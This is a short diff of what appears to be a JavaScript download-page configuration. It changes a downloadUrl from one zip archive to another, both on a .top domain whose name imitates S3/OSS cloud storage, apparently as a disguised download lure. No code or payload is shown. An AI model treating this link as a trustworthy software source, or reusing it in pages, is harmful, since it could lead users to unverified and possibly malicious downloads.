@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://s3trrreow-s3-oss.top/Axs_win7-11_RdBorks-xhs_347.12.zip", 
+    downloadUrl: "https://s3trrreow-s3-oss.top/Axs_win10-11_Reboks-xhs_3461.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
